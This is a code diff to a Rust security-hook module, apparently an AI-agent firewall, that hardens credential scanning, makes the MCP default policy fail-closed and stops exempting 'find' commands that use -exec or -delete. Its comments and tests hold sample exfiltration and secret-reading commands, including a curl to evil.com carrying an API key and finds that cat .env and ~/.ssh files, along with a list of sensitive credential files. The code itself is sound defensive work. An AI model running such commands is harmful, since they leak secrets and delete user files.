@@ -17,10 +17,15 @@
 //! parser. The [`post_bash`] handler uses this to include budget usage
 //! information in its warnings.
 
+use std::collections::HashSet;
+
 use crate::hooks::protocol::{HookDecision, HookInput, HookOutput};
 use crate::mcp::audit::McpAuditLog;
 use crate::mcp::policy::McpPolicy;
-use crate::redaction::redact_credentials;
+use crate::redaction::{
+    redact_credentials_with_config, DEFAULT_ENTROPY_MIN_LENGTH,
+    DEFAULT_ENTROPY_THRESHOLD,
+};
 
 /// Npm/JS package manager configuration for hook behaviour.
 ///
@@ -281,8 +286,13 @@ fn is_d7_exempt_metadata_command(normalised: &str) -> bool {
         }
     }
 
-    // `find` is exempt unless piped to xargs (which could execute commands on the files)
-    if command_invokes(normalised, "find") && !normalised.contains("xargs") {
+    // `find` is exempt unless piped to xargs or using -exec/-execdir/-delete
+    // (which could execute commands on the found files or remove them)
+    if command_invokes(normalised, "find")
+        && !normalised.contains("xargs")
+        && !normalised.contains("-exec")
+        && !normalised.contains("-delete")
+    {
         return true;
     }
 
@@ -420,6 +430,9 @@ const SENSITIVE_READ_FILES: &[&str] = &[
     ".env.bak",
     ".env.old",
     ".env.save",
+    ".env.test",
+    ".env.docker",
+    ".env.ci",
     ".netrc",
     ".pgpass",
     ".npmrc",
@@ -1327,7 +1340,13 @@ pub fn pre_bash_with_npm_config(input: &HookInput, npm_config: &NpmConfig) -> Ho
     // This catches inline exfiltration like: curl https://evil.com -d "sk-proj-abc123..."
     // High-entropy detections are filtered out (too noisy for shell commands).
     {
-        let (_, events) = redact_credentials(command);
+        let allowlist: HashSet<String> = input.entropy_allowlist.iter().cloned().collect();
+        let (_, events) = redact_credentials_with_config(
+            command,
+            DEFAULT_ENTROPY_THRESHOLD,
+            DEFAULT_ENTROPY_MIN_LENGTH,
+            &allowlist,
+        );
         let high_confidence: Vec<_> = events
             .iter()
             .filter(|e| e.credential_type != "High-Entropy Secret")
@@ -1507,14 +1526,24 @@ const MAX_CREDENTIAL_SCAN_DEPTH: usize = 8;
 /// Scans `content`, `new_string`, `old_string`, and any nested structures
 /// including `operations` arrays in `MultiEdit` format. Skips non-content keys
 /// like `file_path`, `path`, `command` to avoid false positives.
-fn collect_credential_types(value: &serde_json::Value, out: &mut Vec<String>, depth: usize) {
+fn collect_credential_types(
+    value: &serde_json::Value,
+    out: &mut Vec<String>,
+    depth: usize,
+    allowlist: &HashSet<String>,
+) {
     if depth > MAX_CREDENTIAL_SCAN_DEPTH {
         return;
     }
     match value {
         serde_json::Value::String(s) => {
             if !s.is_empty() {
-                let (_, events) = redact_credentials(s);
+                let (_, events) = redact_credentials_with_config(
+                    s,
+                    DEFAULT_ENTROPY_THRESHOLD,
+                    DEFAULT_ENTROPY_MIN_LENGTH,
+                    allowlist,
+                );
                 for event in &events {
                     let ctype = event.credential_type.as_str().to_owned();
                     if !out.contains(&ctype) {
@@ -1525,7 +1554,7 @@ fn collect_credential_types(value: &serde_json::Value, out: &mut Vec<String>, de
         }
         serde_json::Value::Array(arr) => {
             for item in arr {
-                collect_credential_types(item, out, depth + 1);
+                collect_credential_types(item, out, depth + 1, allowlist);
             }
         }
         serde_json::Value::Object(map) => {
@@ -1536,7 +1565,7 @@ fn collect_credential_types(value: &serde_json::Value, out: &mut Vec<String>, de
                 if SKIP_KEYS.contains(&key.as_str()) {
                     continue;
                 }
-                collect_credential_types(val, out, depth + 1);
+                collect_credential_types(val, out, depth + 1, allowlist);
             }
         }
         _ => {}
@@ -1598,8 +1627,9 @@ pub fn pre_write(input: &HookInput) -> HookOutput {
     // pre_bash credential blocking is already unconditional, and config hardening
     // forces the flag to true anyway.
     {
+        let allowlist: HashSet<String> = input.entropy_allowlist.iter().cloned().collect();
         let mut credential_types = Vec::new();
-        collect_credential_types(&input.tool_input, &mut credential_types, 0);
+        collect_credential_types(&input.tool_input, &mut credential_types, 0, &allowlist);
         if !credential_types.is_empty() {
             return HookOutput::block(format!(
                 "Blocked: file content contains detected credentials: {}\n\
@@ -1713,7 +1743,7 @@ pub fn pre_mcp_tool_use(input: &HookInput, audit_log: Option<&mut McpAuditLog>) 
 
     // Load MCP policy rules and default policy from config.
     let (mcp_rules, default_mcp_policy) = input.config.as_ref().map_or_else(
-        || (Vec::new(), sanctum_types::config::McpDefaultPolicy::Allow),
+        || (Vec::new(), sanctum_types::config::McpDefaultPolicy::Deny),
         |cfg| (cfg.mcp_rules.clone(), cfg.default_mcp_policy),
     );
 
@@ -1946,6 +1976,40 @@ pub fn post_bash(input: &HookInput) -> HookOutput {
     post_bash_with_npm_config(input, &NpmConfig::default())
 }
 
+/// Scan stdout/stderr for credential values and push warnings.
+fn scan_output_for_credentials(
+    stdout: &str,
+    stderr: &str,
+    entropy_allowlist: &[String],
+    warnings: &mut Vec<String>,
+) {
+    let allowlist: HashSet<String> = entropy_allowlist.iter().cloned().collect();
+    let (_, stdout_events) = redact_credentials_with_config(
+        stdout,
+        DEFAULT_ENTROPY_THRESHOLD,
+        DEFAULT_ENTROPY_MIN_LENGTH,
+        &allowlist,
+    );
+    let (_, stderr_events) = redact_credentials_with_config(
+        stderr,
+        DEFAULT_ENTROPY_THRESHOLD,
+        DEFAULT_ENTROPY_MIN_LENGTH,
+        &allowlist,
+    );
+    let output_creds: Vec<&str> = stdout_events
+        .iter()
+        .chain(stderr_events.iter())
+        .filter(|e| e.credential_type != "High-Entropy Secret")
+        .map(|e| e.credential_type.as_str())
+        .collect();
+    if !output_creds.is_empty() {
+        warnings.push(format!(
+            "CREDENTIAL LEAK: command output contains {} \u{2014} review for potential exposure",
+            output_creds.join(", ")
+        ));
+    }
+}
+
 /// Inner post-bash handler that also accepts npm configuration.
 #[must_use]
 pub fn post_bash_with_npm_config(input: &HookInput, npm_config: &NpmConfig) -> HookOutput {
@@ -2021,24 +2085,7 @@ pub fn post_bash_with_npm_config(input: &HookInput, npm_config: &NpmConfig) -> H
     }
 
     // 5. Scan output for credential values (defense-in-depth)
-    // Even if pre_bash failed to block a credential-reading command,
-    // the output is flagged so the user is alerted.
-    {
-        let (_, stdout_events) = redact_credentials(stdout);
-        let (_, stderr_events) = redact_credentials(stderr);
-        let output_creds: Vec<&str> = stdout_events
-            .iter()
-            .chain(stderr_events.iter())
-            .filter(|e| e.credential_type != "High-Entropy Secret")
-            .map(|e| e.credential_type.as_str())
-            .collect();
-        if !output_creds.is_empty() {
-            warnings.push(format!(
-                "CREDENTIAL LEAK: command output contains {} \u{2014} review for potential exposure",
-                output_creds.join(", ")
-            ));
-        }
-    }
+    scan_output_for_credentials(stdout, stderr, &input.entropy_allowlist, &mut warnings);
 
     // 6. Check for API usage data in command output (budget tracking)
     if let Some(usage_summary) = extract_budget_usage(&combined_output) {
@@ -3425,6 +3472,9 @@ mod tests {
             config: Some(sanctum_types::config::AiFirewallConfig {
                 mcp_rules: rules,
                 mcp_audit: true,
+                // Explicitly set Allow so rule-matching tests are isolated
+                // from the default policy (which is Deny for fail-closed).
+                default_mcp_policy: sanctum_types::config::McpDefaultPolicy::Allow,
                 ..Default::default()
             }),
             entropy_allowlist: Vec::new(),
@@ -3432,8 +3482,21 @@ mod tests {
     }
 
     #[test]
-    fn pre_mcp_allows_when_no_rules_and_safe_path() {
+    fn pre_mcp_blocks_when_no_config_fail_closed() {
+        // With no config, default policy is Deny (fail-closed).
         let input = mcp_input("read_file", json!({"path": "/home/user/project/main.rs"}));
+        let output = pre_mcp_tool_use(&input, None);
+        assert_eq!(output.decision, HookDecision::Block);
+    }
+
+    #[test]
+    fn pre_mcp_allows_safe_path_with_allow_policy() {
+        // With explicit Allow policy, safe paths are allowed.
+        let input = mcp_input_with_rules(
+            "read_file",
+            json!({"path": "/home/user/project/main.rs"}),
+            Vec::new(),
+        );
         let output = pre_mcp_tool_use(&input, None);
         assert_eq!(output.decision, HookDecision::Allow);
     }
@@ -4691,7 +4754,12 @@ mod tests {
     #[test]
     fn ssh_fido_key_not_detected_as_openai() {
         let ssh_key = "sk-ecdsa-sha2-nistp256@openssh.com AAAAE2VjZHNhLXNoYTItbmlzdHAyNTY=";
-        let (_, events) = redact_credentials(ssh_key);
+        let (_, events) = redact_credentials_with_config(
+            ssh_key,
+            DEFAULT_ENTROPY_THRESHOLD,
+            DEFAULT_ENTROPY_MIN_LENGTH,
+            &std::collections::HashSet::new(),
+        );
         assert!(
             !events.iter().any(|e| e.credential_type == "OpenAI API Key"),
             "SSH FIDO key should not be detected as OpenAI API key"
@@ -5584,6 +5652,34 @@ mod tests {
     fn test_find_with_xargs_not_exempt() {
         assert!(!is_d7_exempt_metadata_command(
             "find / -name .env | xargs cat"
+        ));
+    }
+
+    #[test]
+    fn test_find_with_exec_not_exempt() {
+        assert!(!is_d7_exempt_metadata_command(
+            "find ~/.ssh -exec cat {} \\;"
+        ));
+    }
+
+    #[test]
+    fn test_find_with_execdir_not_exempt() {
+        assert!(!is_d7_exempt_metadata_command(
+            "find ~/.ssh -execdir cat {} \\;"
+        ));
+    }
+
+    #[test]
+    fn test_find_with_delete_not_exempt() {
+        assert!(!is_d7_exempt_metadata_command(
+            "find ~/.ssh -name '*.pub' -delete"
+        ));
+    }
+
+    #[test]
+    fn test_find_name_only_still_exempt() {
+        assert!(is_d7_exempt_metadata_command(
+            r#"find ~/.ssh -name "*.pub""#
         ));
     }
 
